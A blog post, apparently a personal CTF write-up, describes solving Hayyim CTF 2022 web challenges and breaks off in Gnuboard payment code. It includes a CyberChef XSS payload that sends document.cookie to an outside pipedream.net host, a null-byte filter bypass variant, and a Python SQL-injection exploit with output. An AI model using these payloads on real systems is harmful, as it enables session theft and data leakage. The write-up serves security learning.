<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Hayyim CTF 2022 Write Up :: My New Hugo Site</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="This article is about write-up for the Hayyim CTF 2022. there is only four web challenges, all of which contain XSS and SQL Injection and Logic Bug on Gnuboard bug" />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://blog.404error.life/posts/2022-02-13-hayyim-ctf/" />







  
  
  
  
  
  <link rel="stylesheet" href="https://blog.404error.life/styles.css">







  <link rel="shortcut icon" href="https://blog.404error.life/img/theme-colors/orange.png">
  <link rel="apple-touch-icon" href="https://blog.404error.life/img/theme-colors/orange.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Hayyim CTF 2022 Write Up">
<meta property="og:description" content="This article is about write-up for the Hayyim CTF 2022. there is only four web challenges, all of which contain XSS and SQL Injection and Logic Bug on Gnuboard bug" />
<meta property="og:url" content="https://blog.404error.life/posts/2022-02-13-hayyim-ctf/" />
<meta property="og:site_name" content="My New Hugo Site" />

  
    <meta property="og:image" content="img/favicon/%!s(&lt;nil&gt;).png">
  

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2022-02-13 23:29:53 &#43;0000 UTC" />













  


</head>
<body class="">




<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="https://blog.404error.life/">
  <div class="logo">
    re-Terminal
  </div>
</a>

    </div>
    
    
  </div>
  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="https://blog.404error.life/posts/2022-02-13-hayyim-ctf/">Hayyim CTF 2022 Write Up</a>
  </h1>
  <div class="post-meta"><time class="post-date">2022-02-13</time>
    
</div>

  
  



  

  <div class="post-content"><div>
        <h1 id="summary">Summary<a href="#summary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>This weekend, Hayyim Security hosted the CTF, and I participated in it for about 3 ~ 4 hours and I was solved Cyberchef, Not E and Cyber Headchef challenges.</p>
<hr>
<h1 id="web-cyberchef-100-pts">(Web) Cyberchef [100 pts]<a href="#web-cyberchef-100-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>The Cyberchef is a simple XSS challenge. Cyberchef service is open source that provides encryption/decryption service and has 1-Day vulnerability.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>http://cyberchef:8000/#recipe=Scatter_chart(&#39;Line%20feed&#39;,&#39;Space&#39;,false,&#39;&#39;,&#39;&#39;,&#39;red&#34;&gt;&lt;script&gt;fetch(&#34;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/&#34;.concat(document.cookie))&lt;/script&gt;&#39;,100,false)&amp;input=MTAwLCAxMDA
</span></span></code></pre></div><p>1-Day issues can be found <a href="https://github.com/gchq/CyberChef/issues/1265">here</a>. And I was able to get the flag by sending the above PoC to the admin bot.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>FLAG : hsctf{fa98fe3d32b4302aff1c322c925238a9d935b636f265cbfdd798391ca9c5a905}
</span></span></code></pre></div><hr>
<h1 id="web-not-e-158-pts">(Web) Not E [158 pts]<a href="#web-not-e-158-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>The Not E challenge is a SQL Injection issue. In this problem, we are using our own binding function, not the Prepared Binding function provided by sqlite of Node, and this function has a vulnerability.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sqlite3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;sqlite3&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">flag</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;fs&#39;</span>).<span style="color:#a6e22e">readFileSync</span>(<span style="color:#e6db74">&#39;/flag&#39;</span>).<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Database</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">filename</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">db</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">sqlite3</span>.<span style="color:#a6e22e">Database</span>(<span style="color:#a6e22e">filename</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">serialize</span>(() =&gt; {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">run</span>(<span style="color:#e6db74">&#39;create table members (username text, password text)&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">run</span>(<span style="color:#e6db74">&#39;create table posts (id text, title text, content text, owner text)&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">run</span>(<span style="color:#e6db74">&#39;create table flag (flag text)&#39;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">run</span>(<span style="color:#e6db74">&#39;insert into flag values (?)&#39;</span>, [ <span style="color:#a6e22e">flag</span> ]);
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#75715e">// (skip..)
</span></span></span></code></pre></div><p>I could see the FLAG were stored in a table called <code>flag</code>. So, in order to solve this challenge, we have to use SQL Injection to leak the flags contained in the table. Otherwise, read the /flag file using RCE, but this is not possible. Therefore, we should focus on SQL Injection.</p>
<ul>
<li>/login</li>
<li>/logout</li>
<li>/new</li>
<li>/view/:noteId</li>
</ul>
<p>First, the functions provided by the Note service are login, post writing, and post reading functions.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">checkParam</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">param</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">param</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;string&#39;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">param</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">param</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">256</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>And all input values are type checked by checkParam function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>  <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#a6e22e">formatQuery</span>(<span style="color:#a6e22e">sql</span>, <span style="color:#a6e22e">params</span> <span style="color:#f92672">=</span> []) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">param</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">params</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">param</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;number&#39;</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sql</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sql</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#a6e22e">param</span>);
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">param</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;string&#39;</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sql</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sql</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">param</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/[&#34;\\]/g</span>, <span style="color:#e6db74">&#39;&#39;</span>)));
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">sql</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">sql</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#34;&#34;</span>); <span style="color:#75715e">// unreachable
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sql</span>;
</span></span><span style="display:flex;"><span>  };
</span></span></code></pre></div><p>In addition, all sql queries are using custom binding function. I thought there was a weakness here. The reason is that the server uses the custom binding function even though the node&rsquo;s sqlite provides the binding function.</p>
<p>In the formatQuery() function, after using the JSON.stringify() method to convert the input value into a string, you can see that the generated value and &lsquo;?&rsquo; are replaced.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#e6db74">&#39;Hello Pocas&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#34;Hello Pocas&#34;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#e6db74">&#34;Hello Pocas&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#34;Hello Pocas&#34;&#39;</span>
</span></span></code></pre></div><p>When JSON.stringify() is used, double quotation marks(&quot;) are added to both ends of the string as shown above.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">insert</span> <span style="color:#66d9ef">into</span> posts <span style="color:#66d9ef">values</span> (<span style="color:#e6db74">&#39;noteid&#39;</span>, <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">?</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#f92672">?</span>, <span style="color:#f92672">?</span>)
</span></span></code></pre></div><p>If you use the writing function and pass a question mark character as the value of title, the query is created as above. And when you check the value of the second argument of the query, you can see that a question mark is created after the string (&quot;&quot;), and the value of content is replaced with the question mark randomly generated. so you can escape the double quarter by this.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> uuid
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://1.230.253.91:1000&#34;</span>
</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> uuid<span style="color:#f92672">.</span>uuid4()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Exploit&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Username  : </span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>sess <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Login/Register</span>
</span></span><span style="display:flex;"><span>account <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>:username, <span style="color:#e6db74">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;pocas&#34;</span>}
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> sess<span style="color:#f92672">.</span>post(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/login&#39;</span>, data<span style="color:#f92672">=</span>account)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Leak the flag</span>
</span></span><span style="display:flex;"><span>poc <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;title&#34;</span>:<span style="color:#e6db74">&#34;?&#34;</span>, <span style="color:#e6db74">&#34;content&#34;</span>:<span style="color:#e6db74">&#34;,(select flag from flag),?)--&#34;</span>}
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> sess<span style="color:#f92672">.</span>post(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/new&#39;</span>, data<span style="color:#f92672">=</span>poc)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Parse the flag path</span>
</span></span><span style="display:flex;"><span>flag_path <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;\/view\/[0-9a-z]*&#39;</span>, sess<span style="color:#f92672">.</span>get(url)<span style="color:#f92672">.</span>text)<span style="color:#f92672">.</span>group()
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Flag Path : </span><span style="color:#e6db74">{</span>flag_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Read the flag</span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;hsctf\{[0-9a-z]*\}&#39;</span>, sess<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> flag_path)<span style="color:#f92672">.</span>text)<span style="color:#f92672">.</span>group()
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Real FLAG : </span><span style="color:#e6db74">{</span>flag<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>Finally I wrote the exploit code as above</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span> ⚡ root@pocas  ~  python3 poc.py
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Exploit
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Username  : 116588a5-5cb1-46e8-917e-5f7ea12408bf
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Flag Path : /view/7fc3144da56dd8c9dbdfded1b3f35c44
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Real FLAG : hsctf<span style="color:#f92672">{</span>038d083216a920c589917b898ff41fd9611956b711035b30766ffaf2ae7f75f2<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span> ⚡ root@pocas  ~ 
</span></span></code></pre></div><pre tabindex="0"><code>FLAG : hsctf{038d083216a920c589917b898ff41fd9611956b711035b30766ffaf2ae7f75f2}
</code></pre><hr>
<h1 id="web-cyber-headchef-390-pts">(Web) Cyber Headchef [390 pts]<a href="#web-cyber-headchef-390-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>The Cyber Headchef challenge is Cyberchef&rsquo;s v2 and this is a 0-Day Challenge. (This is an unintended solution)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/report&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">url</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">checkUrl</span>(<span style="color:#a6e22e">url</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/?message=invalid argument&#39;</span>);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">unescape</span>(<span style="color:#a6e22e">url</span>).<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#39;chart&#39;</span>) <span style="color:#f92672">!==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/?message=sorry, headchef doesn\&#39;t like chart!&#39;</span>);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">checkRateLimit</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">ip</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">`/?message=rate limited`</span>);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">visitUrl</span>(<span style="color:#a6e22e">url</span>)
</span></span><span style="display:flex;"><span>      .<span style="color:#a6e22e">then</span>(() =&gt; <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/?message=reported&#39;</span>));
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>});
</span></span></code></pre></div><p>This is filtering the characters called chart among the function names used in the 1-Day exploit.  But this can be bypassed using null byte injection</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>http://cyberchef:8000/#recipe=Scatter_ch%00art(&#39;Line%20feed&#39;,&#39;Space&#39;,false,&#39;&#39;,&#39;&#39;,&#39;red&#34;&gt;&lt;script&gt;fetch(&#34;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/&#34;.concat(document.cookie))&lt;/script&gt;&#39;,100,false)&amp;input=MTAwLCAxMDA
</span></span></code></pre></div><p>So I was able to get the flag by sending the above PoC to the admin bot.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>FLAG : hsctf{be9e5b8bce203e203597dca3d67e0f7a38e359a9ab7799988e888be073c78da0}
</span></span></code></pre></div><hr>
<h1 id="webnot-solve-gnuboard-498-pts">(Web/Not Solve) Gnuboard [498 pts]<a href="#webnot-solve-gnuboard-498-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>The Gnuboard challenge is to solve it using 0-Day. This challenge was so difficult that I couldn&rsquo;t solve it while the competition was in progress, and after the competition I asked <a href="https://blog.ssrf.kr/">as3617</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-docker" data-lang="docker"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> ubuntu:20.04</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ARG</span> DEBIAN_FRONTEND<span style="color:#f92672">=</span>noninteractive
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">RUN</span> apt-get update<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> apt-get install -y wget curl apache2 git php-gd php-mysql php<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> git clone https://github.com/gnuboard/gnuboard5 /tmp/gnuboard<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> cp -r /tmp/gnuboard/* /var/www/html<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> sed -i <span style="color:#e6db74">&#39;s/AllowOverride None/AllowOverride All/g&#39;</span> /etc/apache2/apache2.conf<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /var/www/html</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mkdir data<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> chmod <span style="color:#ae81ff">777</span> data<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> rm -rf index.html /tmp/gnuboard<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> echo <span style="color:#e6db74">&#39;$flag = &#34;hsctf{flag_will_be_here}&#34;;&#39;</span> &gt;&gt; /var/www/html/common.php<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ADD</span> entrypoint.sh /<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> /entrypoint.sh<span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>I could see in the docker file that the latest version of Gnuboard 5 was being used, and the flag was defined as a variable called $flag in <code>common.php</code>. So, after a long time, I started to analyze GnuBoard and found the SQL Injection vector, but it might not work well, and even if SQL Injection occurs, I don&rsquo;t think I can do anything using it. So I had to give up.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>Hint : Gnuboard, It really has too many functions to be a just &#34;board&#34;. It seems the way how they implement the payment is meh.
</span></span></code></pre></div><p>Hayyim Security provided a hint because there was no solver for the challenge. Hint mentioned the payment part.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">include_once</span>(<span style="color:#e6db74">&#39;./_common.php&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// (Skip..)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//#############################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// 인증결과 파라미터 일괄 수신
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//#############################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//      $var = $_REQUEST[&#34;data&#34;];
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//#####################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// 인증이 성공일 경우만
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//#####################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_REQUEST[<span style="color:#e6db74">&#39;resultCode&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">strcmp</span>(<span style="color:#e6db74">&#39;0000&#39;</span>, $_REQUEST[<span style="color:#e6db74">&#39;resultCode&#39;</span>]) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//############################################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// 1.전문 필드 값 설정(***가맹점 개발수정***)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">//############################################
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>        $charset <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;UTF-8&#39;</span>;        <span style="color:#75715e">// 리턴형식[UTF-8,EUC-KR](가맹점 수정후 고정)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>        $format <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;JSON&#39;</span>;        <span style="color:#75715e">// 리턴형식[XML,JSON,NVP](가맹점 수정후 고정)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// 추가적 noti가 필요한 경우(필수아님, 공백일 경우 미발송, 승인은 성공시, 실패시 모두 Noti발송됨) 미사용
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">//String notiUrl    = &#34;&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>        $authToken <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#39;authToken&#39;</span>];   <span style="color:#75715e">// 취소 요청 tid에 따라서 유동적(가맹점 수정후 고정)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>        $authUrl <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#39;authUrl&#39;</span>];    <span style="color:#75715e">// 승인요청 API url(수신 받은 값으로 설정, 임의 세팅 금지)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>        $netCancel <span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">&#39;netCancelUrl&#39;</span>];   <span style="color:#75715e">// 망취소 API url(수신 받은f값으로 설정, 임의 세팅 금지)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
